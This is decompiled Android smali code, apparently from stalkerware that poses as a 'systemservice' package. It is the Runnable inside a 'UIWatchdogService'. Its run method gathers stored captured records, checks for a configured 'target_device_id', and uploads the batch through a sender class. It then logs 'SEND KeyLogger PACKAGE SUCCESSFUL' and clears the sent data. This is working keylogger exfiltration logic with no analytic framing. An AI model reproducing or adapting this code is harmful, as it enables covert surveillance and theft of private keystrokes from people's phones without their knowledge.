.class Lcom/systemservice/common/groupService/d;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/common/groupService/UIWatchdogService;->onStartCommand(Landroid/content/Intent;II)I
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Landroid/content/SharedPreferences;

.field final synthetic b:Lcom/systemservice/common/groupService/UIWatchdogService;


# direct methods
.method constructor <init>(Lcom/systemservice/common/groupService/UIWatchdogService;Landroid/content/SharedPreferences;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/common/groupService/d;->b:Lcom/systemservice/common/groupService/UIWatchdogService;

    iput-object p2, p0, Lcom/systemservice/common/groupService/d;->a:Landroid/content/SharedPreferences;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 6

    const-string v0, ""

    const-string v1, "TAG"

    :try_start_0
    iget-object v2, p0, Lcom/systemservice/common/groupService/d;->b:Lcom/systemservice/common/groupService/UIWatchdogService;

    invoke-virtual {v2}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_1

    iget-object v2, p0, Lcom/systemservice/common/groupService/d;->a:Landroid/content/SharedPreferences;

    invoke-interface {v2}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->apply()V

    iget-object v2, p0, Lcom/systemservice/common/groupService/d;->b:Lcom/systemservice/common/groupService/UIWatchdogService;

    new-instance v3, Lcom/systemservice/a/h/k;

    iget-object v4, p0, Lcom/systemservice/common/groupService/d;->b:Lcom/systemservice/common/groupService/UIWatchdogService;

    invoke-virtual {v4}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-direct {v3, v4}, Lcom/systemservice/a/h/k;-><init>(Landroid/content/Context;)V

    iput-object v3, v2, Lcom/systemservice/common/groupService/UIWatchdogService;->a:Lcom/systemservice/a/h/k;

    iget-object v2, p0, Lcom/systemservice/common/groupService/d;->b:Lcom/systemservice/common/groupService/UIWatchdogService;

    iget-object v2, v2, Lcom/systemservice/common/groupService/UIWatchdogService;->a:Lcom/systemservice/a/h/k;

    const/4 v3, 0x5

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual {v2, v5, v4, v4, v3}, Lcom/systemservice/a/h/k;->a(ZLjava/util/Date;Ljava/util/Date;I)Ljava/util/List;

    move-result-object v2

    if-eqz v2, :cond_1

    invoke-interface {v2}, Ljava/util/List;->size()I

    move-result v3

    if-lez v3, :cond_1

    iget-object v3, p0, Lcom/systemservice/common/groupService/d;->a:Landroid/content/SharedPreferences;

    const-string v4, "target_device_id"

    invoke-interface {v3, v4, v0}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_1

    new-instance v0, Lcom/systemservice/a/c/h/j;

    iget-object v3, p0, Lcom/systemservice/common/groupService/d;->b:Lcom/systemservice/common/groupService/UIWatchdogService;

    invoke-virtual {v3}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-direct {v0, v3, v5}, Lcom/systemservice/a/c/h/j;-><init>(Landroid/content/Context;Z)V

    iget-object v3, p0, Lcom/systemservice/common/groupService/d;->b:Lcom/systemservice/common/groupService/UIWatchdogService;

    invoke-virtual {v3}, Landroid/app/Service;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-virtual {v0, v3, v2}, Lcom/systemservice/a/c/h/j;->b(Landroid/content/Context;Ljava/util/List;)I

    move-result v0

    const/4 v3, 0x1

    if-ne v0, v3, :cond_0

    sget-object v3, Lcom/systemservice/a/a/j;->h:Lorg/apache/log4j/Logger;

    const-string v4, "KeyLogger: SEND KeyLogger SUCCESSFUL"

    invoke-virtual {v3, v4}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    const-string v3, "SEND KeyLogger PACKAGE SUCCESSFUL"

    invoke-static {v1, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v3, p0, Lcom/systemservice/common/groupService/d;->b:Lcom/systemservice/common/groupService/UIWatchdogService;

    iget-object v3, v3, Lcom/systemservice/common/groupService/UIWatchdogService;->a:Lcom/systemservice/a/h/k;

    invoke-virtual {v3, v2}, Lcom/systemservice/a/h/k;->a(Ljava/util/List;)V

    goto :goto_0

    :cond_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v3, "SEND KeyLogger PACKAGE ERROR"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "ret_code = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :cond_1
    :goto_1
    return-void
.end method
